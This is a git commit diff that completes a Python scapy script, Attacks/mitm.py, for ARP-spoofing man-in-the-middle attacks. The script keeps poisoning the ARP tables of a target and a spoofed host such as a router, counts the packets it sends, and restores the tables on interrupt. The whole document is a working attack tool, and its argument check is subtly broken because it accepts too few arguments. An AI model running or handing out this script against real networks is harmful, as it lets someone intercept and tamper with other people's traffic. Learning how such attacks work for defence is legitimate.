98f20d69633e549291609226437fa02535a1deec
root <root@localhost.localdomain>
2019-05-01 18:53:31 -0700

    Man in the middle finished

--- Attacks/mitm.py
+++ Attacks/mitm.py
@@ -1,6 +1,8 @@
 #! usr/bin/etc python3
 
 import scapy.all as scapy
+from subprocess import Popen, PIPE
+import re
 import os
 import sys
 import time
@@ -16,23 +18,39 @@ import time
 
 def poison_arp(target_ip, target_mac, spoof_ip):
     packet = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) #Associate the mac address of router with kali machine
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
-
+def restore(t_ip, m_ip, s_ip, s_m):
+    t_ip2 = s_ip
+    m_ip2 = s_m 
+    
+    s_ip = t_ip
+    s_m = m_ip
+    packet = scapy.ARP(op=2, pdst = s_ip, hwdst = s_m, psrc = t_ip2, hwsrc = m_ip2)
+    scapy.send(packet, verbose=False)
+    print("[+] ARP table restored.")
 
 def main():
-    if(len(sys.argv) < 4):
-        print("Pass in Target IP + MAC && Spoof IP + MAC. . . [4] total args")
+    if(len(sys.argv) < 2):
+        print("Pass in Target IP/MAC + Spoof IP/MAC. . .")
     else:
         t_ip = sys.argv[1]
         m_ip = sys.argv[2]
         s_ip = sys.argv[3]
         s_m = sys.argv[4]
-
-        while True:
-            poison_arp(t_ip, m_ip, s_ip)
-            poison_arp(s_ip, s_m, t_ip)
-            time.sleep(2)
+        i=0
+        try:
+            while True:
+                    poison_arp(t_ip, m_ip, s_ip)
+                    poison_arp(s_ip, s_m, t_ip)
+                    i += 2
+                    print("\r[+] Total Packets sent: [{0}]".format(i), end="")
+                    sys.stdout.flush()
+                    time.sleep(2)
+        except(KeyboardInterrupt):
+            print("\n[-] Program stopped.")
+            restore(t_ip, m_ip, s_ip, s_m)
+            exit()
 
 if __name__ == '__main__':
     main()
